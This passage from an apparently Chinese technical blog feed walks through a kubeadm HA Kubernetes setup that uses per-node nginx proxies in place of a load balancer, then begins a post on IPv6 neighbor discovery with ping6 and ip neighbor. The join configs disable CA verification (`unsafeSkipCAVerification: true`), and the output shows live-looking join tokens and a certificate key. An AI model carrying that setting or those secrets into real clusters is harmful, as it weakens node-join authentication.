class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@install1 17:55:10 tmp]$kubeadm init --config kubeadm.yaml --upload-certs</span><br><span class="line">...</span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run "kubectl apply -f [podnetwork].yaml" with one of the options listed at:</span><br><span class="line">  https://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">You can now join any number of the control-plane node running the following command on each as root:</span><br><span class="line"></span><br><span class="line">  kubeadm join 192.168.17.11:6443 --token 0xsbed.rcfk0ew0nlgrpjv0 \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:1be9652019ef048fdd1d16385907c519e5559a1b786aa3ff1c46eeb489e1a6ef \</span><br><span class="line">    --control-plane --certificate-key 2368ee7ebe6697164c46812e358539638de1d7665b3111afde949bce73275029</span><br><span class="line"></span><br><span class="line">Please note that the certificate-key gives access to cluster sensitive data, keep it secret!</span><br><span class="line">As a safeguard, uploaded-certs will be deleted in two hours; If necessary, you can use </span><br><span class="line">"kubeadm init phase upload-certs --upload-certs" to reload certs afterward.</span><br><span class="line"></span><br><span class="line">Then you can join any number of worker nodes by running the following on each as root:</span><br><span class="line"></span><br><span class="line">kubeadm join 192.168.17.11:6443 --token 0xsbed.rcfk0ew0nlgrpjv0 \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:1be9652019ef048fdd1d16385907c519e5559a1b786aa3ff1c46eeb489e1a6ef</span><br></pre></td></tr></table></figure></p><h3 id="ControlPlane2"><a href="#ControlPlane2" class="headerlink" title="ControlPlane2"></a>ControlPlane2</h3><p>kubeadm 配置文件如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@install2 17:40:52 tmp]$cat kubeadm.yaml</span><br><span class="line">apiVersion: kubeadm.k8s.io/v1beta2</span><br><span class="line">kind: JoinConfiguration</span><br><span class="line">discovery:</span><br><span class="line">  bootstrapToken:</span><br><span class="line">    apiServerEndpoint: 192.168.17.11:6443</span><br><span class="line">    token: 0xsbed.rcfk0ew0nlgrpjv0</span><br><span class="line">    unsafeSkipCAVerification: true</span><br><span class="line">  timeout: 5m0s</span><br><span class="line">  tlsBootstrapToken: 0xsbed.rcfk0ew0nlgrpjv0</span><br><span class="line">controlPlane:</span><br><span class="line">  localAPIEndpoint:</span><br><span class="line">    advertiseAddress: 192.168.17.12</span><br><span class="line">    bindPort: 6443</span><br><span class="line">  certificateKey: 2368ee7ebe6697164c46812e358539638de1d7665b3111afde949bce73275029</span><br><span class="line">nodeRegistration:</span><br><span class="line">  name: installer2</span><br></pre></td></tr></table></figure><p>执行部署动作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@install2 17:40:58 tmp]$kubeadm join --config kubeadm.yaml</span><br><span class="line">...</span><br><span class="line">This node has joined the cluster and a new control plane instance was created:</span><br><span class="line"></span><br><span class="line">* Certificate signing request was sent to apiserver and approval was received.</span><br><span class="line">* The Kubelet was informed of the new secure connection details.</span><br><span class="line">* Control plane (master) label and taint were applied to the new node.</span><br><span class="line">* The Kubernetes control plane instances scaled up.</span><br><span class="line">* A new etcd member was added to the local/stacked etcd cluster.</span><br><span class="line"></span><br><span class="line">To start administering your cluster from this node, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">        mkdir -p $HOME/.kube</span><br><span class="line">        sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">        sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">Run 'kubectl get nodes' to see this node join the cluster.</span><br></pre></td></tr></table></figure><h3 id="ControlPlane3"><a href="#ControlPlane3" class="headerlink" title="ControlPlane3"></a>ControlPlane3</h3><p>kubeadm 配置文件如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@install3 17:47:24 tmp]$cat kubeadm.yaml</span><br><span class="line">apiVersion: kubeadm.k8s.io/v1beta2</span><br><span class="line">kind: JoinConfiguration</span><br><span class="line">discovery:</span><br><span class="line">  bootstrapToken:</span><br><span class="line">    apiServerEndpoint: 192.168.17.11:6443</span><br><span class="line">    token: 0xsbed.rcfk0ew0nlgrpjv0</span><br><span class="line">    unsafeSkipCAVerification: true</span><br><span class="line">  timeout: 5m0s</span><br><span class="line">  tlsBootstrapToken: 0xsbed.rcfk0ew0nlgrpjv0</span><br><span class="line">controlPlane:</span><br><span class="line">  localAPIEndpoint:</span><br><span class="line">    advertiseAddress: 192.168.17.13</span><br><span class="line">    bindPort: 6443</span><br><span class="line">  certificateKey: 2368ee7ebe6697164c46812e358539638de1d7665b3111afde949bce73275029</span><br><span class="line">nodeRegistration:</span><br><span class="line">  name: installer2</span><br></pre></td></tr></table></figure><p>执行部署动作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@install3 17:47:25 tmp]$kubeadm join --config kubeadm.yaml</span><br><span class="line">...</span><br><span class="line">This node has joined the cluster and a new control plane instance was created:</span><br><span class="line"></span><br><span class="line">* Certificate signing request was sent to apiserver and approval was received.</span><br><span class="line">* The Kubelet was informed of the new secure connection details.</span><br><span class="line">* Control plane (master) label and taint were applied to the new node.</span><br><span class="line">* The Kubernetes control plane instances scaled up.</span><br><span class="line">* A new etcd member was added to the local/stacked etcd cluster.</span><br><span class="line"></span><br><span class="line">To start administering your cluster from this node, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">        mkdir -p $HOME/.kube</span><br><span class="line">        sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">        sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">Run 'kubectl get nodes' to see this node join the cluster.</span><br></pre></td></tr></table></figure><h3 id="node1"><a href="#node1" class="headerlink" title="node1"></a>node1</h3><p>3 个 ControlPlane 节点已经部署完成，我们可以通过 kubectl 命令获取对应的状态信息，因为没有部署 CNI，所以这里还是 NotReady 的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@install1 18:00:50 tmp]$kubectl get node -o wide</span><br><span class="line">NAME         STATUS     ROLES    AGE     VERSION   INTERNAL-IP     EXTERNAL-IP   OS-IMAGE                KERNEL-VERSION                        CONTAINER-RUNTIME</span><br><span class="line">install1     NotReady   master   5m2s    v1.16.3   172.18.19.11    &lt;none&gt;        CentOS Linux 7 (Core)   3.10.0-1062.1.2.el7.smartx.1.x86_64   docker://19.3.5</span><br><span class="line">installer2   NotReady   master   4m22s   v1.16.3   192.168.17.12   &lt;none&gt;        CentOS Linux 7 (Core)   3.10.0-1062.1.2.el7.smartx.1.x86_64   docker://19.3.5</span><br><span class="line">installer3   NotReady   master   3m1s    v1.16.3   192.168.17.13   &lt;none&gt;        CentOS Linux 7 (Core)   3.10.0-1062.1.2.el7.smartx.1.x86_64   docker://19.3.5</span><br><span class="line">[root@install1 18:00:53 tmp]$</span><br></pre></td></tr></table></figure><p>现在要来部署 worker node，当我们有可用的 LB，时，我们无需关心 APIServer 的可用性，由 LB 来决定。那么现在没有可用的 LB，我们的 worker node 想要与 k8s 进行通信，就需要每个 worker node 自身启动一个 proxy，将自己的 kubelet 连接到自己本地，然后通过 proxy 到集群中已有的 APIServer 。</p><h4 id="配置-Proxy"><a href="#配置-Proxy" class="headerlink" title="配置 Proxy"></a>配置 Proxy</h4><p>这里以 nginx 举例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[root@install4 18:05:03 ~]$mkdir /etc/nginx</span><br><span class="line">[root@install4 18:06:02 ~]$chmod 700 /etc/nginx</span><br><span class="line">[root@install4 18:14:23 ~]$cat /etc/nginx/nginx.conf</span><br><span class="line">error_log stderr notice;</span><br><span class="line"></span><br><span class="line">worker_processes 2;</span><br><span class="line">worker_rlimit_nofile 130048;</span><br><span class="line">worker_shutdown_timeout 10s;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">  multi_accept on;</span><br><span class="line">  use epoll;</span><br><span class="line">  worker_connections 16384;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stream &#123;</span><br><span class="line">  upstream kube_apiserver &#123;</span><br><span class="line">    least_conn;</span><br><span class="line">    server 192.168.17.11:6443;</span><br><span class="line">    server 192.168.17.12:6443;</span><br><span class="line">    server 192.168.17.13:6443;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  server &#123;</span><br><span class="line">    listen        127.0.0.1:6443;</span><br><span class="line">    proxy_pass    kube_apiserver;</span><br><span class="line">    proxy_timeout 10m;</span><br><span class="line">    proxy_connect_timeout 1s;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">  aio threads;</span><br><span class="line">  aio_write on;</span><br><span class="line">  tcp_nopush on;</span><br><span class="line">  tcp_nodelay on;</span><br><span class="line"></span><br><span class="line">  keepalive_timeout 5m;</span><br><span class="line">  keepalive_requests 100;</span><br><span class="line">  reset_timedout_connection on;</span><br><span class="line">  server_tokens off;</span><br><span class="line">  autoindex off;</span><br><span class="line"></span><br><span class="line">  server &#123;</span><br><span class="line">    listen 8081;</span><br><span class="line">    location /healthz &#123;</span><br><span class="line">      access_log off;</span><br><span class="line">      return 200;</span><br><span class="line">    &#125;</span><br><span class="line">    location /stub_status &#123;</span><br><span class="line">      stub_status on;</span><br><span class="line">      access_log off;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">[root@install4 18:18:29 manifests]$vim /etc/sysctl.conf </span><br><span class="line">[root@install4 18:18:54 manifests]$sysctl -p </span><br><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">net.ipv4.ip_local_reserved_ports = 30000-32767</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">net.bridge.bridge-nf-call-arptables = 1</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br></pre></td></tr></table></figure><h4 id="加入-K8s-集群"><a href="#加入-K8s-集群" class="headerlink" title="加入 K8s 集群"></a>加入 K8s 集群</h4><p>执行部署动作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@install4 18:31:10 tmp]$kubeadm join 192.168.17.11:6443 --token 0xsbed.rcfk0ew0nlgrpjv0 \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:1be9652019ef048fdd1d16385907c519e5559a1b786aa3ff1c46eeb489e1a6ef </span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">        [WARNING IsDockerSystemdCheck]: detected "cgroupfs" as the Docker cgroup driver. The recommended driver is "systemd". Please follow the guide at https://kubernetes.io/docs/setup</span><br><span class="line">/cri/</span><br><span class="line">        [WARNING SystemVerification]: this Docker version is not on the list of validated versions: 19.03.5. Latest validated version: 18.09</span><br><span class="line">        [WARNING Hostname]: hostname "install4" could not be reached</span><br><span class="line">        [WARNING Hostname]: hostname "install4": lookup install4 on 192.168.31.215:53: no such host</span><br><span class="line">[preflight] Reading configuration from the cluster...</span><br><span class="line">[preflight] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -oyaml'</span><br><span class="line">[kubelet-start] Downloading configuration for the kubelet from the "kubelet-config-1.16" ConfigMap in the kube-system namespace</span><br><span class="line">[kubelet-start] Writing kubelet configuration to file "/var/lib/kubelet/config.yaml"</span><br><span class="line">[kubelet-start] Writing kubelet environment file with flags to file "/var/lib/kubelet/kubeadm-flags.env"</span><br><span class="line">[kubelet-start] Activating the kubelet service</span><br><span class="line">[kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap...</span><br><span class="line"></span><br><span class="line">This node has joined the cluster:</span><br><span class="line">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class="line">* The Kubelet was informed of the new secure connection details.</span><br><span class="line"></span><br><span class="line">Run 'kubectl get nodes' on the control-plane to see this node join the cluster.</span><br></pre></td></tr></table></figure><p>此时在 K8s 集群中存在 4个节点，其中 3 个是 ControlPlane 节点，1 个是 worker 节点，但是此时 worker 节点是连接的 192.168.17.11:6443 APIServer，如果 这个 APIServer 故障了，那么的 worker 节点就无法正常与集群通讯了，需要进行以下操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[root@install4 18:37:51 kubernetes]$systemctl stop kubelet docker</span><br><span class="line">[root@install4 18:38:09 manifests]$pwd</span><br><span class="line">/etc/kubernetes/manifests</span><br><span class="line">[root@install4 18:38:12 manifests]$cat nginx-proxy.yml </span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-proxy</span><br><span class="line">  namespace: kube-system</span><br><span class="line">  labels:</span><br><span class="line">    addonmanager.kubernetes.io/mode: Reconcile</span><br><span class="line">    k8s-app: kube-nginx</span><br><span class="line">  annotations:</span><br><span class="line">spec:</span><br><span class="line">  hostNetwork: true</span><br><span class="line">  dnsPolicy: ClusterFirstWithHostNet</span><br><span class="line">  nodeSelector:</span><br><span class="line">    beta.kubernetes.io/os: linux</span><br><span class="line">  priorityClassName: system-node-critical</span><br><span class="line">  containers:</span><br><span class="line">  - name: nginx-proxy</span><br><span class="line">    image: docker.io/library/nginx:1.17</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    resources:</span><br><span class="line">      requests:</span><br><span class="line">        cpu: 25m</span><br><span class="line">        memory: 32M</span><br><span class="line">    securityContext:</span><br><span class="line">      privileged: true</span><br><span class="line">    livenessProbe:</span><br><span class="line">      httpGet:</span><br><span class="line">        path: /healthz</span><br><span class="line">        port: 8081</span><br><span class="line">    readinessProbe:</span><br><span class="line">      httpGet:</span><br><span class="line">        path: /healthz</span><br><span class="line">        port: 8081</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /etc/nginx</span><br><span class="line">      name: etc-nginx</span><br><span class="line">      readOnly: true</span><br><span class="line">  volumes:</span><br><span class="line">  - name: etc-nginx</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /etc/nginx</span><br></pre></td></tr></table></figure><p>修改 kubelet 配置文件，将 Server 字段替换为 <code>127.0.0.1:6443</code> ，启动 kubelet 和 docker 即可。</p><h2 id="配置修改"><a href="#配置修改" class="headerlink" title="配置修改"></a>配置修改</h2><p>最开始我以为到这里就结束了，结果在自己测试的过程中，发现了一点问题，使用 kubeadm 部署集群，在添加 ControlPlane 的时候，会将 kubelet 所连接的 APIServer 配置为 controlPlaneEndpoint 地址，这在没有 LB 的场景下是致命的，单点故障。</p><p>所以我们需要依次的修改所有节点的 kubelet 配置，修改内容如下：</p><h3 id="ControlPlane"><a href="#ControlPlane" class="headerlink" title="ControlPlane"></a>ControlPlane</h3><p>因为所有的 ControlPlane 节点都会自己运行 APIServer，那么 kubelet 连接自身即可。</p><h3 id="Worker"><a href="#Worker" class="headerlink" title="Worker"></a>Worker</h3><p>Worker 节点因为没有 APIServer，所以我们刚刚通过配置本地的 Proxy 来达到相同的目的，这里无需再次修改。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到这里我们的集群已经配置完成了，无论是 ControlPlane 节点故障，还是 Worker 节点故障，都不是单点的，可以起到高可用的作用。这种方式其实是没有 LB 的一种妥协，这里引用 Kubespray 关于 HA 模式的文档：</p><blockquote><p>K8s components require a loadbalancer to access the apiservers via a reverse proxy. Kubespray includes support for an nginx-based proxy that resides on each non-master Kubernetes node. This is referred to as localhost loadbalancing. It is less efficient than a dedicated load balancer because it creates extra health checks on the Kubernetes apiserver, but is more practical for scenarios where an external LB or virtual IP management is inconvenient. </p></blockquote><p>如果有 LB 肯定还是优先 LB 的，但是在没有 LB 的情况下我们如何选择，就看我们自己的场景了，如果真的是自建 Keepalived &amp; HAProxy ，那么之后的集群管理是一个很麻烦的事情，而且 Keepalived 在使用上没有那么的友好，尤其是网络环境复杂之后（我之前碰到过一次 ovs &amp; keepalived 不工作的情况）。</p><p>目前社区中关于 K8S 生命周期管理的工具越来越多，但是如果仔细看看，其实大家的做法都是大同小异。还是要自己了解一下具体的问题点在哪里，如何解决才是硬道理。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/kubernetes-sigs/kubespray" target="_blank" rel="noopener">https://github.com/kubernetes-sigs/kubespray</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;之前写过一篇&lt;a href=&quot;https://zdyxry.github.io/2019/06/15/Kubernetes-%E5%AE%9
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://zdyxry.github.io/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>邻居发现协议（NDP）简易实现</title>
    <link href="https://zdyxry.github.io/2019/12/11/%E9%82%BB%E5%B1%85%E5%8F%91%E7%8E%B0%E5%8D%8F%E8%AE%AE%EF%BC%88NDP%EF%BC%89%E7%AE%80%E6%98%93%E5%AE%9E%E7%8E%B0/"/>
    <id>https://zdyxry.github.io/2019/12/11/邻居发现协议（NDP）简易实现/</id>
    <published>2019-12-11T13:29:59.000Z</published>
    <updated>2019-12-13T12:22:13.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在做节点管理时，经常面临节点自动扫描，自动关联等功能，这时候需要 NDP 来帮助我们来完成，关于 NDP 的实现有几种方式，今天来聊一下这个。</p><h2 id="邻居发现协议（NDP）"><a href="#邻居发现协议（NDP）" class="headerlink" title="邻居发现协议（NDP）"></a>邻居发现协议（NDP）</h2><p>引用维基百科的介绍：</p><blockquote><p>The Neighbor Discovery Protocol (NDP, ND)[1] is a protocol in the Internet protocol suite used with Internet Protocol Version 6 (IPv6). It operates at the link layer of the Internet model (RFC 1122), and is responsible for gathering various information required for internet communication, including the configuration of local connections and the domain name servers and gateways used to communicate with more distant systems.[2]</p></blockquote><p>这里有两点需要关注：</p><ol><li>与 IPv6 一起使用</li><li>工作在数据链路层（link layer）</li></ol><h3 id="IPv6-地址"><a href="#IPv6-地址" class="headerlink" title="IPv6 地址"></a>IPv6 地址</h3><p>在 IPv6 中，无论我们的网络环境是否存在 DHCP Server，我们只要配置网卡启动 IPv6 选项，将网卡置为 active 状态，就能获取到对应的 IPv6 地址，这是因为 IPv6中支持 IP 自动配置，大概流程如下：</p><ol><li>根据 MAC 地址产生链路本地地址（link-local address）</li><li>发出邻居发现请求，进行重复地址检测，如果重复，则停止配置</li><li>链路本地地址生效，发送路由请求报文（RS）</li></ol><h4 id="单播地址"><a href="#单播地址" class="headerlink" title="单播地址"></a>单播地址</h4><p>单播地址中又分为三类：</p><ol><li>可聚合的全局单播地址，相当于公网 IPv4 地址</li><li>链路本地地址，相当于IPv4里面的169.254.0.0/16地址，一般自动生成</li><li>独特本地单播地址</li></ol><h4 id="组播地址"><a href="#组播地址" class="headerlink" title="组播地址"></a>组播地址</h4><table><thead><tr><th>IPv6 常用组播地址</th><th>IPv4 常用组播地址</th><th>组播组</th></tr></thead><tbody><tr><td>节点-本地范围</td><td>节点-本地范围</td><td>节点-本地范围</td></tr><tr><td>FF01::1</td><td>224.0.0.1</td><td>所有-节点地址</td></tr><tr><td>FF01::2</td><td>224.0.0.2</td><td>所有-路由器地址</td></tr><tr><td>链路-本地范围</td><td>链路-本地范围</td><td>链路-本地范围</td></tr><tr><td>FF02::1</td><td>224.0.0.1</td><td>所有-节点地址</td></tr><tr><td>FF02::2</td><td>224.0.0.2</td><td>所有-路由器地址</td></tr><tr><td>FF02::5</td><td>224.0.0.5</td><td>OSPF IGP</td></tr><tr><td>FF02::6</td><td>224.0.0.6</td><td>OSPF IGP DR</td></tr></tbody></table><h4 id="任播地址"><a href="#任播地址" class="headerlink" title="任播地址"></a>任播地址</h4><p>在 IPv6 中，没有广播的概念，而是使用任播代替。在任播中，网络地址与网络节点之前存在一对多的关系：每一个地址对应一群接收节点，但是在任何给定时间，只有其中之一可以接收到传送端发来的信息。</p><p>邻居发现协议 NDP 是 IPv6 协议体系中一个重要的基础协议，替代了IPv4的 ARP 和 ICMP 路由器发现，定义了使用 ICMPv6 报文实现地址解析、跟踪邻居状态、重复地址检测、路由器发现以及重定向等功能。</p><h2 id="IPv6-地址发现"><a href="#IPv6-地址发现" class="headerlink" title="IPv6 地址发现"></a>IPv6 地址发现</h2><p>因为我本人也没有完整阅读过相应 RFC 文档，在这里也不详细描述每个报文的具体格式及每个字段是什么意思了，直接看看怎么实现。</p><h3 id="ping6-amp-组播"><a href="#ping6-amp-组播" class="headerlink" title="ping6 &amp; 组播"></a>ping6 &amp; 组播</h3><p>如果我们知道了一个主机的 IPv6 地址，我们可以通过 <code>ping6</code> 来检测是否联通：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:/tmp/nnn</span><br><span class="line"><span class="meta"> $</span><span class="bash"> ping6 fe80::5054:ff:fe80:95d9%eth0</span></span><br><span class="line">PING fe80::5054:ff:fe80:95d9%eth0(fe80::5054:ff:fe80:95d9%eth0) 56 data bytes</span><br><span class="line">64 bytes from fe80::5054:ff:fe80:95d9%eth0: icmp_seq=1 ttl=64 time=0.045 ms</span><br><span class="line">64 bytes from fe80::5054:ff:fe80:95d9%eth0: icmp_seq=2 ttl=64 time=0.055 ms</span><br><span class="line">^C</span><br><span class="line">--- fe80::5054:ff:fe80:95d9%eth0 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 999ms</span><br><span class="line">rtt min/avg/max/mdev = 0.045/0.050/0.055/0.005 ms</span><br></pre></td></tr></table></figure><p>那么有了这个 <code>ping6</code> 命令和上面提到的组播地址，我们就可以通过 <code>ping6</code> 直接 ping 组播地址就能知道那些地址可以联通了，那么应该选择哪个？应该选择 <code>FF01::1</code> ，因为我们想要实现的是获取 IPv6 地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:/tmp/nnn</span><br><span class="line"><span class="meta"> $</span><span class="bash"> ping6 -c1 -I eth0 <span class="string">'ff02::1%eth0'</span></span></span><br><span class="line">PING ff02::1%eth0(ff02::1%eth0) from fe80::5054:ff:fe80:95d9%eth0 eth0: 56 data bytes</span><br><span class="line">64 bytes from fe80::5054:ff:fe80:95d9%eth0: icmp_seq=1 ttl=64 time=0.045 ms</span><br><span class="line"></span><br><span class="line">--- ff02::1%eth0 ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms</span><br></pre></td></tr></table></figure><p>因为我的实验环境里节点太多，这里使用 <code>-c</code> 参数限制发送 ECHO_REQUEST 包的数量为 1。</p><p>在发送组播之后，如果能够联通，那么系统会记录对应的 ARP 信息，我们可以通过 <code>ip</code> 命令直接获取：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:/tmp/nnn</span><br><span class="line"><span class="meta"> $</span><span class="bash"> ip -6 neighbor show dev eth0 | head -n 5</span></span><br><span class="line">fe80::8c6e:a0ff:fe19:f146 lladdr 8e:6e:a0:19:f1:46 DELAY</span><br><span class="line">fe80::8010:f1ff:fe02:af40 lladdr 82:10:f1:02:af:40 DELAY</span><br><span class="line">fe80::baca:3aff:feec:fdac lladdr b8:ca:3a:ec:fd:ac DELAY</span><br><span class="line">fe80::f11c:e35a:912:dbc9 lladdr 52:54:00:0a:b3:fc DELAY</span><br><span class="line">fe80::570d:aa51:dc3b:1f02 lladdr 00:50:56:9b:f6:6c DELAY</span><br></pre></td></tr></table></figure><p>这样就拿到了自己节点在二层联通的所有 IPv6 地址了。</p><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>既然已经使用了 <code>ping6</code>，那么可以使用一些更高级的工具，比如 Nmap，Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 